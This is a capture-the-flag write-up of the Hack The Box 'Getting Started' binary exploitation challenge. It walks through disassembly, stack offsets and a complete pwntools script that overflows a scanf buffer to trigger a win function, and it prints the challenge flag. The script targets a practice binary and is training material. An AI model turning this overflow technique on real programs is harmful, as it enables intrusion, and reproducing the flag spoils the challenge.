# Getting Started - HTB PWN Challenge Write-up

**Author:** L27Sen  
**Platform:** Hack The Box  
**Category:** PWN (Binary Exploitation)  
**Difficulty:** Easy  
**Date:** January 2026

---

## Table of Contents

1. [Challenge Overview](#challenge-overview)
2. [Initial Analysis](#initial-analysis)
3. [Binary Security Analysis](#binary-security-analysis)
4. [Reverse Engineering](#reverse-engineering)
5. [Vulnerability Analysis](#vulnerability-analysis)
6. [Exploitation Strategy](#exploitation-strategy)
7. [Exploit Development](#exploit-development)
8. [Flag Capture](#flag-capture)
9. [Lessons Learned](#lessons-learned)

---

## Challenge Overview

**Challenge Name:** Getting Started  
**Description:** Get ready for the last guided challenge and your first real exploit. It's time to show your hacking skills.  
**Target:** `83.136.249.164:56976`

### Files Provided

```
challenge/
├── flag.txt              # Local test flag
├── gs                    # Target ELF binary
├── wrapper.py            # Python exploit template
└── glibc/
    ├── ld-linux-x86-64.so.2
    └── libc.so.6
```

---

## Initial Analysis

First, we identify the binary type to understand what we're working with:

```bash
$ file gs
gs: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, 
interpreter ./glibc/ld-linux-x86-64.so.2, BuildID[sha1]=505eb225ba13a677aa5f00d5e3d840f63237871f, 
for GNU/Linux 3.2.0, not stripped
```

**Key Observations:**
- **Architecture:** 64-bit x86-64
- **Type:** PIE (Position Independent Executable)
- **Linking:** Dynamically linked with custom glibc
- **Symbols:** Not stripped (function names are available)

---

## Binary Security Analysis

Using `checksec` to analyze the binary's security mitigations:

```bash
$ checksec --file=gs
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols
Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   RW-RUNPATH   81 Symbols
```

### Security Features Summary

| Protection | Status | Implication |
|------------|--------|-------------|
| **Full RELRO** | ✅ Enabled | GOT is read-only after relocation |
| **Stack Canary** | ❌ Disabled | Stack buffer overflows are exploitable |
| **NX** | ✅ Enabled | Stack is non-executable |
| **PIE** | ✅ Enabled | Base address is randomized |

**Critical Finding:** No stack canary means we can overflow stack buffers without detection. This is a strong indicator that the vulnerability involves a stack-based buffer overflow.

---

## Reverse Engineering

### Disassembly Analysis

Using `objdump` to disassemble the binary and identify key functions:

#### Win Function (0x11f5)

```asm
00000000000011f5 <win>:
    11f5:       push   %rbp
    11f6:       mov    %rsp,%rbp
    11f9:       sub    $0x10,%rsp
    11fd:       mov    $0x0,%esi
    1202:       lea    0xdff(%rip),%rdi        # "flag.txt"
    1209:       mov    $0x0,%eax
    120e:       call   10c0 <open@plt>         # open("flag.txt", 0)
    ...
    1245:       call   1090 <fputc@plt>        # prints flag character by character
    ...
    1271:       ret
```

The `win()` function opens `flag.txt` and prints its contents to stdout. **This is our target function.**

#### Main Function (0x16a0)

```asm
00000000000016a0 <main>:
    16a0:       push   %rbp
    16a1:       mov    %rsp,%rbp
    16a4:       sub    $0x30,%rsp              # Allocate 48 bytes on stack
    ...
    16be:       movq   $0x0,-0x30(%rbp)        # Buffer starts at -0x30 (offset 48)
    ...
    16de:       mov    $0xdeadbeef,%eax
    16e3:       mov    %rax,-0x8(%rbp)         # Check value at -0x8 (offset 8)
    ...
    17a1:       lea    -0x30(%rbp),%rax
    17a5:       mov    %rax,%rsi
    17a8:       lea    0xf32(%rip),%rdi        # "%s" format string
    17af:       mov    $0x0,%eax
    17b4:       call   10e0 <__isoc99_scanf@plt>  # VULNERABLE: scanf("%s", buffer)
    ...
    17c5:       mov    $0xdeadbeef,%eax
    17ca:       cmp    %rax,-0x8(%rbp)         # Compare check value
    17ce:       jne    17dc <main+0x13c>       # If NOT equal, jump to win
    17d0:       mov    $0x20,%edi
    17d5:       call   1030 <putchar@plt>      # If equal, print space (normal exit)
    17da:       jmp    17e1 <main+0x141>
    17dc:       call   11f5 <win>              # Call win() if check failed!
```

---

## Vulnerability Analysis

### Stack Layout

Based on the disassembly, the stack layout in `main()` is:

```
High Address
┌─────────────────────┐
│   Return Address    │  ← rbp + 0x8
├─────────────────────┤
│    Saved RBP        │  ← rbp
├─────────────────────┤
│   Check Value       │  ← rbp - 0x8   (stores 0xdeadbeef)
│   (8 bytes)         │
├─────────────────────┤
│   Unused/Padding    │  ← rbp - 0x10
│   (8 bytes)         │
├─────────────────────┤
│                     │
│   Input Buffer      │  ← rbp - 0x30  (scanf writes here)
│   (32 bytes usable) │
│                     │
└─────────────────────┘
Low Address
```

### The Vulnerability

1. **Insecure Input:** `scanf("%s", buffer)` reads input without bounds checking
2. **No Stack Canary:** Buffer overflow won't be detected
3. **Conditional Win:** If `check_value != 0xdeadbeef`, the `win()` function is called

### Offset Calculation

- Buffer starts at: `rbp - 0x30` (offset 48 from rbp)
- Check value at: `rbp - 0x8` (offset 8 from rbp)
- **Distance:** `0x30 - 0x8 = 0x28 = 40 bytes`

**To reach and overwrite the check value, we need exactly 40 bytes of padding.**

---

## Exploitation Strategy

The exploitation is straightforward:

1. Send 40 bytes of padding to fill the buffer and reach the check value
2. Overwrite the check value with anything **other than** `0xdeadbeef`
3. The comparison will fail, triggering the call to `win()`
4. The flag will be printed to stdout

**Payload Structure:**
```
[ 40 bytes padding ] [ 8 bytes to overwrite check ]
         ↓                        ↓
      'A' * 40              'B' * 8 (or any value ≠ 0xdeadbeef)
```

---

## Exploit Development

### Final Exploit Script (wrapper.py)

```python
#!/usr/bin/python3.8

'''
You need to install pwntools to run the script.
To run the script: python3 ./wrapper.py
'''

# Library
from pwn import *

# Open connection
IP   = '83.136.249.164' # Remote server
PORT = 56976            # Remote port

r    = remote(IP, PORT)

# Craft payload
# Buffer is at -0x30, check value at -0x8
# Distance = 0x30 - 0x8 = 0x28 = 40 bytes
# We need to overwrite the check value with anything other than 0xdeadbeef
payload = b'A' * 40 + b'BBBBBBBB'  # 40 bytes padding + 8 bytes to overwrite check

# Send payload
r.sendline(payload)

# Read flag
success(f'Flag --> {r.recvline_contains(b"HTB").strip().decode()}')
```

### Payload Breakdown

| Component | Size | Value | Purpose |
|-----------|------|-------|---------|
| Padding | 40 bytes | `'A' * 40` | Fill buffer to reach check value |
| Overwrite | 8 bytes | `'BBBBBBBB'` | Replace `0xdeadbeef` with `0x4242424242424242` |

---

## Flag Capture

### Execution

```bash
$ python3 wrapper.py
[+] Opening connection to 83.136.249.164 on port 56976: Done
[+] Flag --> HTB{b0f_tut0r14l5_4r3_g00d}
[*] Closed connection to 83.136.249.164 port 56976
```

### Flag

```
HTB{b0f_tut0r14l5_4r3_g00d}
```

---

## Lessons Learned

### Key Takeaways

1. **Always Check Binary Protections:** `checksec` revealed the absence of stack canaries, immediately suggesting a buffer overflow attack vector.

2. **Identify Win Conditions:** Not all PWN challenges require ROP chains or shellcode. Here, we simply needed to corrupt a check variable.

3. **Understand Stack Layout:** Calculating precise offsets from disassembly is crucial for reliable exploitation.

4. **`scanf("%s")` is Dangerous:** This function reads until whitespace without bounds checking, making it a classic source of buffer overflows.

### Mitigation Recommendations

For developers looking to prevent this type of vulnerability:

- Use `fgets()` or `scanf("%Ns")` with explicit size limits
- Enable stack canaries (`-fstack-protector-strong`)
- Use ASAN/MSAN during development for runtime checks
- Validate all input lengths before processing

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `file` | Binary identification |
| `checksec` | Security mitigation analysis |
| `objdump` | Disassembly and reverse engineering |
| `pwntools` | Exploit development and execution |

---

## References

- [pwntools Documentation](https://docs.pwntools.com/)
- [checksec.sh](https://github.com/slimm609/checksec.sh)
- [Stack Buffer Overflow - OWASP](https://owasp.org/www-community/vulnerabilities/Buffer_Overflow)

---

*Write-up by L27Sen | Hack The Box - Getting Started*
